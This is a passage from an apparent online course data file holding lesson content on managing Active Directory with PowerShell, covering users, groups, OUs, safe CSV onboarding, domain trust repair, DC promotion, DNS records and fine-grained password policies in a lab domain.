    slug: 'ad-users-groups-and-ous',
    title: 'Active Directory Users, Groups, OUs & Trust Channel Repair',
    subtitle: 'Manage directory identities at scale, onboard users safely from a CSV, and repair a broken domain trust (lab: corp.example.com)',
    estimatedMinutes: 35,
    oneSentenceSummary:
      'The `ActiveDirectory` module lets you create, query, and organize thousands of domain users (`*-ADUser`), groups (`*-ADGroup`), and Organizational Units (`*-ADOrganizationalUnit`), and repair a broken workstation trust with `Test-ComputerSecureChannel -Repair`.',
    summary:
      'Active Directory (AD) is the central identity vault of almost every enterprise network on earth. Instead of clicking through "Active Directory Users and Computers" (`dsa.msc`) for hours, we use the `ActiveDirectory` PowerShell module to provision users from CSV files, manage group memberships, protect OUs from accidental deletion, and fix the dreaded *"The trust relationship between this workstation and the primary domain failed"* error without unjoining and rejoining the domain (in the lab: `corp.example.com`, DC `DC01`)!',
    whyItMatters:
      'Automating user onboarding/offboarding and fixing domain trust issues in seconds are staple expectations for every Windows Systems and Security Engineer.',
    learningObjectives: [
      'Create, query (`-Filter` & `-Properties`), modify, and delete domain users using `New-ADUser`, `Get-ADUser`, `Set-ADUser`, and `Remove-ADUser`',
      'Explain why `Get-ADUser` only returns a small default set of properties unless you request extra attributes with `-Properties`',
      'Create and populate Security Groups (`New-ADGroup`, `Add-ADGroupMember`, `Get-ADGroupMember`) and Organizational Units (`New-ADOrganizationalUnit`)',
      'Join computers to a domain (`Add-Computer`) and repair a broken domain trust password online with `Test-ComputerSecureChannel -Repair`',
      'Onboard users from a CSV safely: validate, check existence, avoid `SamAccountName` collisions, preview with `-WhatIf`, and write a results file',
    ],
    keyTerms: [
      'ActiveDirectory Module (RSAT)',
      'Get-ADUser -Filter & -Properties',
      'New-ADUser & Set-ADAccountPassword',
      'ADGroup (DomainLocal, Global, Universal)',
      'Organizational Unit (OU) & DistinguishedName (DN)',
      'Test-ComputerSecureChannel -Repair',
    ],
    conceptSections: [
      {
        heading: 'Querying and Provisioning Domain Users (Why Get-ADUser Needs -Properties)',
        body: [
          'Every Active Directory user object in the database actually has **over 100 attributes** (`Department`, `Title`, `Mail`, `LastLogonDate`, `PasswordLastSet`, `LockedOut`). To keep network traffic fast on huge domains, **`Get-ADUser` only fetches 10 basic properties by default** (`DistinguishedName`, `Enabled`, `GivenName`, `Name`, `ObjectClass`, `ObjectGUID`, `SamAccountName`, `SID`, `Surname`, `UserPrincipalName`).',
          'If you need `Department` or `PasswordLastSet`, always ask for it explicitly with **`-Properties`**:\n`Get-ADUser -Filter \'Department -eq "Engineering"\' -Properties Department, Title, PasswordLastSet`\nTip: put the whole filter in **single quotes** and the values inside it in double quotes. If you wrap the filter in double quotes, PowerShell expands `$true` or `$cutoff` *before* Active Directory sees it, which silently breaks filters like `Enabled -eq $true`. Single quotes let the AD filter engine read `$true` itself.',
          'And notice **`-Filter` is mandatory** on `Get-ADUser` when you aren’t querying a single `-Identity`! That enforces the **Filter Left** law so the Domain Controller filters the records before sending them over the wire.',
        ],
      },
      {
        heading: 'Organizational Units (OUs), Security Groups & Bulk CSV Onboarding',
        body: [
          'In Active Directory, we organize users and computers into **Organizational Units (OUs)** so we can link Group Policies (GPOs) and delegate permissions cleanly. Lab setup: see the Lab Setup page. Everything below is lab-only (`corp.example.com`), run from `DC01`:\n• Create an OU: `New-ADOrganizationalUnit -Name "Servers" -Path "DC=corp,DC=example,DC=com" -ProtectedFromAccidentalDeletion $true`\n• Create a Security Group: `New-ADGroup -Name "GRP_SecOps" -GroupScope Global -GroupCategory Security -Path "OU=Groups,DC=corp,DC=example,DC=com"`\n• Add users to a group: `Add-ADGroupMember -Identity "GRP_SecOps" -Members "ihaider", "sarah"`\n• Audit group members: `Get-ADGroupMember -Identity "Domain Admins"`\n• Join a computer to the domain (run on the client, DNS must point at `192.168.56.10`): `Add-Computer -DomainName corp.example.com -Credential CORP\\Administrator -OUPath "OU=Workstations,DC=corp,DC=example,DC=com" -WhatIf` (remove `-WhatIf`, add `-Restart` when the preview looks right)',
        ],
      },
      {
        heading: 'Bulk CSV Onboarding: Safe, Repeatable and Easy to Audit',
        body: [
          'Creating users from a CSV is where mistakes get expensive, so a good onboarding script has five habits:\n1. **Validate each row** (missing name or ID? stop that row, not the whole run).\n2. **Check whether the account already exists** (use a stable key such as `EmployeeID`, not just the name) so running the script twice never makes duplicates. That property is called **idempotent**.\n3. **Handle `SamAccountName` collisions.** The logon name must be unique and at most 20 characters, so `jsmith` for the second John Smith becomes `jsmith2`.\n4. **Rehearse with `-WhatIf`** before creating anything real.\n5. **Write one result row per input row** (Created / Skipped / Failed plus the reason) to a results CSV you can hand to an auditor.',
          'The second code example below puts all five together. Never put real passwords in the CSV: ask for the initial password at the prompt as a `SecureString` and force `ChangePasswordAtLogon`.',
        ],
      },
      {
        heading: 'Lifesaver Command: Fixing Broken Domain Trust Without Rebooting Twice!',
        body: [
          'Have you ever restored a VM snapshot and then got locked out at login with:\n*"The trust relationship between this workstation and the primary domain failed"*?',
          'Why does that happen? Every domain-joined computer has a hidden machine account password that is changed automatically (every 30 days by default). The Domain Controller keeps the current **and the previous** password, so a machine that is merely switched off for a long time normally recovers by itself. Trust really breaks when the two sides no longer share either password, for example:\n• a VM was **reverted to an old snapshot** from before two or more rotations,\n• the computer object was **reset or deleted** in Active Directory (or restored from backup),\n• a VM was **cloned** and both copies are fighting over one computer account.',
          'Old-school admins waste 20 minutes unjoining the computer to a Workgroup, rebooting, rejoining the domain, and rebooting again. **With PowerShell, you can usually repair it in seconds with no unjoin:**\n`Test-ComputerSecureChannel -Repair -Credential (Get-Credential)`\nYou must run it **on the affected computer**, so you need a way to log on first: a **local administrator** account, or a cached domain logon if one still works. Use a domain account that is allowed to reset computer accounts. If the repair fails, `Reset-ComputerMachinePassword -Server DC01 -Credential (Get-Credential)` is the alternative, and rejoining remains the last resort.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Always pass `-Filter` and `-Properties` to `Get-ADUser` so the Domain Controller does the heavy lifting, and use `Test-ComputerSecureChannel -Repair` to fix broken machine trust relationships instantly.',
      },
      {
        type: 'gotcha',
        title: 'When You Get Stuck: Check DNS First',
        body: 'Most AD problems that look like "the domain is broken" are really DNS problems. Before anything else, on the client or member server run:\n1. `Get-DnsClientServerAddress -AddressFamily IPv4` (the only DNS server should be `192.168.56.10`, the DC, never a public DNS or a router).\n2. `Resolve-DnsName corp.example.com` and `Resolve-DnsName DC01.corp.example.com`.\n3. `Test-NetConnection DC01 -Port 389` (LDAP) and `-Port 445`.\nOnly then look at `Add-Computer` or `Test-ComputerSecureChannel` errors. Also remember that the cmdlets in this lesson need the `ActiveDirectory` module (RSAT) and permission in the domain.',
      },
      {
        type: 'gotcha',
        title: 'Why New-ADUser Creates a Disabled Account If You Omit -AccountPassword',
        body: 'Domain password policy forbids active blank passwords. If you run `New-ADUser -Name "bob"` without passing `-AccountPassword <SecureString> -Enabled $true`, Active Directory creates the account in a **Disabled** state!',
      },
      {
        type: 'pro',
        title: 'DistinguishedName (DN) Reading Order: Leaf to Root',
        body: 'An Active Directory `DistinguishedName` reads from most specific to broadest, just like a street address: `CN=Izaz Haider,OU=Security,OU=Staff,DC=corp,DC=local`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-ADUser',
        aliases: [],
        syntax: 'Get-ADUser -Filter <String> [-SearchBase <String>] [-Properties <String[]>]',
        parameters: [
          {
            name: '-Filter',
            type: 'String',
            description: 'Server-side query string evaluated directly by the Domain Controller (e.g., "Department -eq \'IT\'").',
          },
          {
            name: '-Properties',
            type: 'String[]',
            description: 'Requests additional AD attributes beyond the 10 default properties (pass * to inspect all attributes on a single user).',
          },
        ],
        examples: [
          'Get-ADUser -Identity ihaider -Properties *',
          'Get-ADUser -Filter \'Enabled -eq $true -and Department -eq "Security"\' -Properties Department, LastLogonDate',
        ],
      },
      {
        cmdlet: 'Test-ComputerSecureChannel',
        aliases: [],
        syntax: 'Test-ComputerSecureChannel [-Repair] [-Credential <PSCredential>]',
        parameters: [
          {
            name: '-Repair',
            type: 'SwitchParameter',
            description: 'Resets and re-synchronizes the computer account password with the Domain Controller without unjoining or an extra reboot. Run it on the affected computer, with local admin access and a domain account that may reset computer accounts.',
          },
        ],
        examples: ['Test-ComputerSecureChannel -Repair -Credential CORP\\Administrator'],
      },
    ],
    codeExamples: [
      {
        title: 'Creating OUs, Provisioning AD Users, Managing Groups, and Repairing Trust',
        description: 'Complete Active Directory identity workflow using the ActiveDirectory module.',
        code: `# 1. Create a new Organizational Unit (protected from accidental deletion)
New-ADOrganizationalUnit -Name 'Engineering' -Path 'DC=corp,DC=example,DC=com' -ProtectedFromAccidentalDeletion $true

# 2. Create an enabled Active Directory User with an encrypted SecureString password
$secPwd = Read-Host -Prompt 'Enter initial AD password' -AsSecureString
New-ADUser -Name 'Izaz Haider' \`
  -SamAccountName 'ihaider' \`
  -UserPrincipalName 'ihaider@corp.example.com' \`
  -Path 'OU=Engineering,DC=corp,DC=example,DC=com' \`
  -Department 'Security Engineering' \`
  -AccountPassword $secPwd \`
  -ChangePasswordAtLogon $true \`
  -Enabled $true

# 3. Create a Global Security Group and add the user to it
New-ADGroup -Name 'GRP_Eng_Admins' -GroupScope Global -GroupCategory Security -Path 'OU=Engineering,DC=corp,DC=example,DC=com'
Add-ADGroupMember -Identity 'GRP_Eng_Admins' -Members 'ihaider'

# 4. Query users in the Engineering department (single-quoted filter) and request extra attributes
Get-ADUser -Filter 'Department -eq "Security Engineering"' -Properties Department, Created |
  Select-Object Name, SamAccountName, Enabled, Department, Created

# 5. On the AFFECTED computer: verify the secure channel, then repair only if it returned False
Test-ComputerSecureChannel -Verbose
# Test-ComputerSecureChannel -Repair -Credential (Get-Credential)`,
        output: `Name        SamAccountName Enabled Department           Created
----        -------------- ------- ----------           -------
Izaz Haider ihaider           True Security Engineering 11/3/2026 11:55:00 PM

VERBOSE: Performing the operation "Test-ComputerSecureChannel" on target "CLIENT01".
True`,
      },
      {
        title: 'Safe, Idempotent Bulk Onboarding from a CSV (with -WhatIf and a Results File)',
        description: 'Reads newusers.csv (EmployeeID, GivenName, Surname, Department), skips people who already exist, avoids SamAccountName collisions, previews with -WhatIf, and writes one result row per input row. Lab only (corp.example.com).',
        code: `# newusers.csv columns: EmployeeID,GivenName,Surname,Department
Import-Module ActiveDirectory

$dryRun     = $true   # keep $true until the preview looks right, then set $false
$csvPath    = '.\\newusers.csv'
$ou         = 'OU=Engineering,DC=corp,DC=example,DC=com'
$upnSuffix  = 'corp.example.com'
$resultPath = ".\\onboarding-results-$(Get-Date -Format 'yyyy-MM-dd_HH-mm').csv"
$initialPwd = Read-Host 'Initial password for new accounts' -AsSecureString
$planned    = New-Object 'System.Collections.Generic.HashSet[string]'

$results = foreach ($row in Import-Csv -Path $csvPath) {
  $sam = ''; $status = ''; $detail = ''
  try {
    # 1. Validate the row (this also keeps the filters below safe to build)
    if ($row.EmployeeID -notmatch '^\\d{1,10}$' -or -not $row.GivenName -or -not $row.Surname) {
      throw 'Row needs a numeric EmployeeID, GivenName and Surname'
    }

    # 2. Idempotent check: does this employee already have an account?
    $existing = Get-ADUser -Filter "EmployeeID -eq '$($row.EmployeeID)'" -ErrorAction Stop
    if ($existing) {
      $sam = $existing.SamAccountName
      $status = 'Skipped'
      $detail = 'Employee already has an account'
    }
    else {
      # 3. Build a unique SamAccountName (max 20 chars): jsmith, jsmith2, jsmith3 ...
      $base = (($row.GivenName.Substring(0, 1) + $row.Surname) -replace '[^A-Za-z0-9]', '').ToLower()
      if ($base.Length -gt 18) { $base = $base.Substring(0, 18) }
      $sam = $base
      $n = 1
      while ($planned.Contains($sam) -or (Get-ADUser -Filter "SamAccountName -eq '$sam'" -ErrorAction Stop)) {
        $n++
        $sam = "$base$n"
      }
      [void]$planned.Add($sam)

      # 4. Create the account (-WhatIf:$true only prints what would happen)
      New-ADUser -Name "$($row.GivenName) $($row.Surname)" \`
        -GivenName $row.GivenName -Surname $row.Surname \`
        -SamAccountName $sam -UserPrincipalName "$sam@$upnSuffix" \`
        -EmployeeID $row.EmployeeID -Department $row.Department \`
        -Path $ou -AccountPassword $initialPwd \`
        -ChangePasswordAtLogon $true -Enabled $true \`
        -WhatIf:$dryRun -ErrorAction Stop
      $status = if ($dryRun) { 'WhatIf (not created)' } else { 'Created' }
    }
  }
  catch {
    $status = 'Failed'
    $detail = $_.Exception.Message
  }
  # 5. One result row per input row
  [PSCustomObject]@{ EmployeeID = $row.EmployeeID; SamAccountName = $sam; Status = $status; Detail = $detail }
}

$results | Export-Csv -Path $resultPath -NoTypeInformation
$results | Format-Table -AutoSize`,
        output: `What if: Performing the operation "New" on target "CN=Izaz Haider,OU=Engineering,DC=corp,DC=example,DC=com".

EmployeeID SamAccountName Status              Detail
---------- -------------- ------              ------
1001       ihaider        WhatIf (not created)
1002       ihaider2       WhatIf (not created)
1003       sarah          Skipped             Employee already has an account
abc        Failed         Row needs a numeric EmployeeID, GivenName and Surname`,
      },
      {
        title: 'Joining CLIENT01 to the Domain with Add-Computer (Lab)',
        description: 'Run on CLIENT01 (192.168.56.30). Its DNS server must already be 192.168.56.10 (DC01). Preview first, then join and reboot.',
        code: `# Prerequisite: DNS on CLIENT01 points at DC01, and the name resolves
Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, ServerAddresses
Resolve-DnsName corp.example.com

# Preview the join (no change is made)
Add-Computer -DomainName 'corp.example.com' -Credential (Get-Credential 'CORP\\Administrator') -WhatIf

# Do the real join, then reboot to finish it
# Add-Computer -DomainName 'corp.example.com' -Credential (Get-Credential 'CORP\\Administrator') -Restart`,
        output: `What if: Performing the operation "Add-Computer" on target "CLIENT01".`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Running `Get-ADUser -Filter * -Properties *` on a domain with 50,000 users.',
        cause: 'Asking for `*` (all users) AND `*` (all 120+ properties per user) forces the Domain Controller to serialize megabytes of LDAP data.',
        fix: 'Filter specifically with `-Filter` and request only the exact `-Properties` names your script needs (`-Properties Department, Mail, LastLogonDate`).',
      },
    ],
    tryItYourself: [
      'Write a `Get-ADUser` command that finds all locked-out accounts (`Search-ADAccount -LockedOut`) and unlocks them with `Unlock-ADAccount`.',
      'Compare the `DistinguishedName` of an OU (`OU=Engineering,DC=corp,DC=example,DC=com`) with the `DistinguishedName` of a user inside that OU.',
      'Run the CSV onboarding example with `$dryRun = $true` and a 3-row CSV that includes one duplicate surname, one existing EmployeeID and one bad row. Open the results CSV and explain each Status.',
    ],
    knowledgeCheck: [
      {
        question: 'Why does `(Get-ADUser -Identity ihaider).Department` return nothing unless you add `-Properties Department`?',
        options: [
          'Active Directory does not store department names',
          'For performance, Get-ADUser only retrieves 10 core properties by default; any extra attributes must be requested via -Properties',
          'Department is only available on Linux',
          'You must reboot the Domain Controller first',
        ],
        correctIndex: 1,
        explanation: 'Get-ADUser retrieves a lightweight default property set unless you specify additional attribute names with -Properties.',
      },
      {
        question: 'Which command fixes "The trust relationship between this workstation and the primary domain failed" without unjoining the domain or rebooting?',
        options: [
          'Restart-Computer -Force',
          'Test-ComputerSecureChannel -Repair -Credential (Get-Credential)',
          'Remove-ADComputer',
          'Clear-DnsClientCache',
        ],
        correctIndex: 1,
        explanation: 'Test-ComputerSecureChannel -Repair resets the secure channel machine password between the computer and the Domain Controller online. Run it on the affected computer (log on with a local admin or cached account first).',
      },
      {
        question: 'Which situation is a realistic cause of "The trust relationship between this workstation and the primary domain failed"?',
        options: [
          'The laptop was switched off for a few weeks',
          'The VM was reverted to a snapshot older than two machine-password changes, or its computer object was reset or deleted in AD',
          'The user typed the wrong wallpaper',
          'The Domain Controller has too much free disk space',
        ],
        correctIndex: 1,
        explanation: 'The DC remembers the current and previous machine password, so being offline alone does not break trust. A snapshot rollback, a reset or deleted computer object, or a restore does.',
      },
    ],
  },

  {
    id: '12-2',
    chapterId: 'chapter-12',
    slug: 'ad-forests-dns-and-fgpp',
    title: 'Forests, Domain Controllers, DNS Server Management & Fine-Grained Passwords',
    subtitle: 'Deploy AD DS in the lab from PowerShell, query SRV/SOA DNS records, and apply strict password policies to admin groups',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'Promote the lab server `DC01` to the first Domain Controller of `corp.example.com` with `Install-WindowsFeature AD-Domain-Services` + `Install-ADDSForest`, manage DNS zones with `DnsServer` cmdlets, and apply strict password rules to privileged groups using Fine-Grained Password Policies (where lower Precedence numbers win).',
    summary:
      'How do you build a brand-new Active Directory domain on a headless Server Core machine? How does a client PC find a Domain Controller using DNS `SRV` records? And how do you enforce a 20-character password policy on admin accounts while keeping the normal domain policy for regular staff? In this lesson, we master AD forest promotion, DNS server management, and Fine-Grained Password Policies (FGPP). Lab setup: see the Lab Setup page. Promotion changes the whole server, so do it only in the `DC01` lab VM.',
    whyItMatters:
      'Active Directory cannot function without DNS. DNS misconfiguration is the most common cause of "Active Directory failures" in the real world, so checking DNS first saves hours. Knowing how to inspect `SRV` records and manage Fine-Grained Password Policies sets you apart as a senior infrastructure engineer.',
    learningObjectives: [
      'Promote a Windows Server to a Domain Controller using `Install-WindowsFeature AD-Domain-Services` and `Install-ADDSForest`',
      'Inspect forest, domain, DC, and anonymous LDAP `RootDSE` metadata using `Get-ADForest`, `Get-ADDomain`, `Get-ADDomainController`, and `Get-ADRootDSE`',
      'Manage DNS zones and resource records (`A`, `PTR`, `CNAME`, `SOA`, `SRV`) using the `DnsServer` module and client `Resolve-DnsName`',
      'Create Fine-Grained Password Policies (`New-ADFineGrainedPasswordPolicy`) and explain why a **lower Precedence number (`1` vs `10`) always wins**',
    ],
    keyTerms: [
      'Install-ADDSForest & AD-Domain-Services',
      'RootDSE (Get-ADRootDSE)',
      'DNS SRV & SOA Resource Records',
      'Add-DnsServerPrimaryZone & Add-DnsServerResourceRecordA',
      'Fine-Grained Password Policy (FGPP / PSO)',
      'Precedence (Lower Number = Higher Priority)',
    ],
    conceptSections: [
      {
        heading: 'Promoting a Domain Controller & Inspecting the Forest',
        body: [
          'Deploying Active Directory Domain Services (AD DS) on a headless Server Core machine is a multi-step process. **Lab VM only:** promotion reconfigures the server and reboots it automatically, and it cannot be undone without rebuilding or demoting.\n1. **Point the server’s DNS client at itself first.** A new DC hosts the DNS zone for the domain, so its own DNS server must be `127.0.0.1` or its own IP (`192.168.56.10`), not a router or public DNS:\n   `Set-DnsClientServerAddress -InterfaceIndex <n> -ServerAddresses 192.168.56.10`\n2. **Install the role binary bits:**\n   `Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools`\n3. **Promote the server to the first Domain Controller in a new Forest (and install DNS automatically).** Preview with `-WhatIf` first:\n   `Install-ADDSForest -DomainName "corp.example.com" -DomainNetbiosName "CORP" -InstallDns -SafeModeAdministratorPassword (Read-Host "DSRM password" -AsSecureString) -WhatIf`\n   Remove `-WhatIf` to run it for real. `-SafeModeAdministratorPassword` is the Directory Services Restore Mode (DSRM) password, your emergency recovery login, so store it safely. The server restarts on its own when promotion finishes (add `-NoRebootOnCompletion` if you want to control that). The `.local` suffix is discouraged because it clashes with multicast DNS; use a name under a domain you control, such as our lab `corp.example.com`.',
          'Once the Domain Controller reboots, four inspection cmdlets tell you everything about your environment:\n• **`Get-ADForest`:** Shows all domains in the forest, Global Catalogs, and Schema Master.\n• **`Get-ADDomain`:** Shows the Domain SID, NetBIOS name, PDC Emulator, and password policy container.\n• **`Get-ADDomainController`:** Shows the DC’s IP, Site name, and FSMO roles (`OperationMasterRoles`).\n• **`Get-ADRootDSE`:** Reads the top-level LDAP directory root (`defaultNamingContext`, `forestFunctionality`).',
        ],
      },
      {
        heading: 'DNS Server Management: Why Active Directory Lives and Breathes DNS',
        body: [
          'How does a workstation joining `corp.example.com` know which IP address is the Domain Controller? It queries DNS for **`SRV` (Service Locator) records** such as `_ldap._tcp.dc._msdcs.corp.example.com` and `_kerberos._tcp.corp.example.com`!',
          'With the **`DnsServer`** module (and **`DnsClient`** on workstations), you can manage all of DNS from PowerShell:\n• Create an AD-integrated Primary Forward Lookup Zone:\n  `Add-DnsServerPrimaryZone -Name "lab.corp.example.com" -ReplicationScope Domain`\n• Create an `A` (Host) record (and automatically create its reverse `PTR` record, which only works if a matching reverse zone exists):\n  `Add-DnsServerResourceRecordA -ZoneName "corp.example.com" -Name "filesrv01" -IPv4Address "192.168.56.50" -CreatePtr`\n• Inspect `SOA` (Start of Authority) or `SRV` records:\n  `Get-DnsServerResourceRecord -ZoneName "corp.example.com" -RRType "SOA"`\n• Test DNS resolution from any client (the modern PowerShell replacement for `nslookup`):\n  `Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.corp.example.com" -Type SRV`',
        ],
      },
      {
        heading: 'Fine-Grained Password Policies (FGPP): Why Precedence 1 Beats Precedence 50',
        body: [
          'By default, Active Directory’s Default Domain Policy only allows **one** password policy per domain. What if you want regular users to follow the normal domain policy, **but** require your admin accounts to have a **20-character password** and lock out after 3 bad attempts?',
          'We use **Fine-Grained Password Policies (FGPP)** - attached directly to **Users or Global Security Groups** (never to OUs!). Set the full parameter set explicitly so the policy is predictable (lockout duration and window, password age, history and reversible encryption included):\n1. Create the policy (preview with `-WhatIf` first):\n```powershell\n$pso = @{\n  Name = "PSO-Tier0-Admins"; Precedence = 1; MinPasswordLength = 20\n  ComplexityEnabled = $true; LockoutThreshold = 3\n  LockoutDuration = "00:30:00"; LockoutObservationWindow = "00:30:00"\n  MinPasswordAge = "1.00:00:00"; MaxPasswordAge = "60.00:00:00"\n  PasswordHistoryCount = 24; ReversibleEncryptionEnabled = $false\n}\nNew-ADFineGrainedPasswordPolicy @pso -WhatIf\n```\n2. Apply it to a group (use your own admin group; the built-in `Domain Admins` is also a valid subject): **`Add-ADFineGrainedPasswordPolicySubject -Identity "PSO-Tier0-Admins" -Subjects "GRP_Eng_Admins"`**\n• **The Golden Rule of FGPP Precedence:** Just like a race where **1st place beats 10th place**, if a user is covered by two policies, the policy with the **LOWER `Precedence` integer (`1` beats `10`) ALWAYS WINS!**\n• Check which policy actually applies to a specific user: **`Get-ADUserResultantPasswordPolicy -Identity ihaider`**.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'gotcha',
        title: 'When You Get Stuck: DNS First',
        body: '1. A client cannot find the domain? Check its DNS server: `Get-DnsClientServerAddress -AddressFamily IPv4`. It must be `192.168.56.10` (DC01), never a router or public DNS.\n2. Then `Resolve-DnsName -Name _ldap._tcp.dc._msdcs.corp.example.com -Type SRV` (does DC01 answer with its SRV record?).\n3. On DC01 itself: `Get-Service DNS, Netlogon, NTDS` and `dcdiag /test:dns` (read-only checks).\n4. Promotion fails with a DNS warning? Make sure the server’s DNS client points at itself, as above, and that the name is not already used on the network.',
      },
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Clients locate Domain Controllers via DNS `SRV` records, and Fine-Grained Password Policies attach to Security Groups (not OUs!) where the lowest `Precedence` number wins.',
      },
      {
        type: 'gotcha',
        title: 'Two Classic FGPP Traps',
        body: '1. You **cannot** link a Fine-Grained Password Policy to an Organizational Unit (OU), you attach it to a **Security Group** (or individual user).\n2. **Lower `Precedence` number = Higher Priority** (`Precedence 1` overrides `Precedence 100`).',
      },
      {
        type: 'try',
        title: 'Replace nslookup with Resolve-DnsName',
        body: 'Run `Resolve-DnsName -Name microsoft.com -Type A` on your machine right now. Unlike `nslookup`, `Resolve-DnsName` returns real `.NET` objects you can filter and pipe!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-ADFineGrainedPasswordPolicy',
        aliases: [],
        syntax: 'New-ADFineGrainedPasswordPolicy [-Name] <String> -Precedence <Int32> [-MinPasswordLength <Int32>] [-ComplexityEnabled <Boolean>] [-LockoutThreshold <Int32>] [-LockoutDuration <TimeSpan>] [-LockoutObservationWindow <TimeSpan>] [-MinPasswordAge <TimeSpan>] [-MaxPasswordAge <TimeSpan>] [-PasswordHistoryCount <Int32>] [-ReversibleEncryptionEnabled <Boolean>]',
        parameters: [
          {
            name: '-Precedence',
            type: 'Int32',
            description: 'Determines priority when multiple policies apply to a user. Lower integers (e.g., 1) take precedence over higher integers (e.g., 50).',
          },
          {
            name: '-MinPasswordLength',
            type: 'Int32',
            description: 'Minimum number of characters required for the password.',
          },
          {
            name: '-LockoutThreshold / -LockoutDuration / -LockoutObservationWindow',
            type: 'Int32 / TimeSpan',
            description: 'How many bad attempts lock the account, for how long, and over what time window they are counted. Set all three together so the lockout behaves as you expect.',
          },
          {
            name: '-MinPasswordAge / -MaxPasswordAge / -PasswordHistoryCount / -ReversibleEncryptionEnabled',
            type: 'TimeSpan / Int32 / Boolean',
            description: 'Password age limits, how many old passwords are remembered, and whether reversible encryption is allowed (keep it $false). Supply the full set explicitly rather than relying on defaults.',
          },
        ],
        examples: [
          'New-ADFineGrainedPasswordPolicy -Name "Admin-20Char-PSO" -Precedence 1 -MinPasswordLength 20 -ComplexityEnabled $true -LockoutThreshold 3 -LockoutDuration 00:30:00 -LockoutObservationWindow 00:30:00 -MinPasswordAge 1.00:00:00 -MaxPasswordAge 60.00:00:00 -PasswordHistoryCount 24 -ReversibleEncryptionEnabled $false -WhatIf',
        ],
      },
      {
        cmdlet: 'Resolve-DnsName',
        aliases: [],
        syntax: 'Resolve-DnsName [-Name] <String> [-Type <RecordType>] [-Server <String[]>]',
        parameters: [
          {
            name: '-Type',
            type: 'RecordType',
            description: 'Specifies the DNS record type to query (A, AAAA, CNAME, MX, NS, PTR, SOA, SRV, TXT).',
          },
        ],
        examples: ['Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.corp.example.com" -Type SRV'],
      },
    ],
    codeExamples: [
      {
        title: 'Promoting AD DS, Managing DNS Records, and Applying Fine-Grained Password Policies',
        description: 'Lab only, on DC01. Preview the forest promotion, then inspect domain metadata, create a DNS A record, and enforce a Tier-0 Admin Fine-Grained Password Policy.',
        code: `# 0. Before promotion (DC01 only): DNS client must point at the server itself, then preview the promotion
# Set-DnsClientServerAddress -InterfaceIndex 4 -ServerAddresses 192.168.56.10
# Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
# Install-ADDSForest -DomainName 'corp.example.com' -DomainNetbiosName 'CORP' -InstallDns \`
#   -SafeModeAdministratorPassword (Read-Host 'DSRM password' -AsSecureString) -WhatIf

# 1. After the reboot: inspect Active Directory Forest, Domain, and RootDSE metadata
Get-ADForest | Select-Object Name, ForestMode, Domains, SchemaMaster
Get-ADRootDSE | Select-Object defaultNamingContext, dnsHostName, forestFunctionality

# 2. Create a DNS Host (A) record in the corp.example.com zone and verify with Resolve-DnsName
Add-DnsServerResourceRecordA -ZoneName 'corp.example.com' -Name 'intranet' -IPv4Address '192.168.56.80'
Resolve-DnsName -Name 'intranet.corp.example.com' -Type A

# 3. Create a Fine-Grained Password Policy for admins (Precedence 1 = highest priority)
$pso = @{
  Name                        = 'PSO-Admins-Strict'
  Precedence                  = 1
  MinPasswordLength           = 20
  ComplexityEnabled           = $true
  LockoutThreshold            = 5
  LockoutDuration             = '00:30:00'
  LockoutObservationWindow    = '00:30:00'
  MinPasswordAge              = '1.00:00:00'
  MaxPasswordAge              = '60.00:00:00'
  PasswordHistoryCount        = 24
  ReversibleEncryptionEnabled = $false
}
New-ADFineGrainedPasswordPolicy @pso -WhatIf

# Remove -WhatIf to create it for real, then attach it to the GRP_Eng_Admins security group
Add-ADFineGrainedPasswordPolicySubject -Identity 'PSO-Admins-Strict' -Subjects 'GRP_Eng_Admins' -WhatIf
Get-ADUserResultantPasswordPolicy -Identity 'ihaider' | Select-Object Name, Precedence, MinPasswordLength`,
        output: `Name              ForestMode          Domains             SchemaMaster
----              ----------          -------             ------------
corp.example.com  Windows2025Forest   {corp.example.com}  DC01.corp.example.com

Name                       Type   TTL   Section IPAddress
----                       ----   ---   ------- ---------
intranet.corp.example.com  A      3600  Answer  192.168.56.80

Name              Precedence MinPasswordLength
----              ---------- -----------------
PSO-Admins-Strict          1                20`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Trying to apply a Fine-Grained Password Policy (`Add-ADFineGrainedPasswordPolicySubject`) to an Organizational Unit (OU).',
        cause: 'Active Directory Password Settings Objects (PSOs) can only be linked to **Users** or **Global Security Groups**, never OUs.',
        fix: 'Create a Shadow Security Group containing the users in that OU, and attach the FGPP to that Security Group.',
      },
    ],
    tryItYourself: [
      'Run `Get-DnsClientCache | Select-Object -First 10 Entry, RecordName, RecordType, Data` on your PC to inspect your local DNS resolver cache.',
      'Run `Resolve-DnsName -Name google.com -Type MX` to see Google’s mail exchange servers returned as structured PowerShell objects.',
    ],
    knowledgeCheck: [
      {
        question: 'If an Active Directory user belongs to two security groups, Group A (linked to a Fine-Grained Password Policy with Precedence 10) and Group B (linked to a policy with Precedence 50), which password policy wins?',
        options: [
          'The policy with Precedence 50 wins because 50 is larger',
          'The policy with Precedence 10 wins because lower Precedence numbers have higher priority',
          'Neither applies',
          'Both minimum lengths are added together',
        ],
        correctIndex: 1,
        explanation: 'In Fine-Grained Password Policies, Precedence 1 is highest priority, so Precedence 10 overrides Precedence 50.',
      },
      {
        question: 'Which DNS record type do Windows computers query to locate Active Directory Domain Controllers (LDAP and Kerberos services)?',
        options: ['MX (Mail Exchange)', 'SRV (Service Locator)', 'TXT (Text)', 'CNAME (Alias)'],
        correctIndex: 1,
        explanation: 'Active Directory relies on DNS SRV records (such as _ldap._tcp.dc._msdcs.<domain>) so clients can discover Domain Controllers dynamically.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 13: GROUP POLICY (GPO), WINDOWS FIREWALL & TASK AUTOMATION
  // ==========================================================================
  {
    id: '13-1',
    chapterId: 'chapter-13',
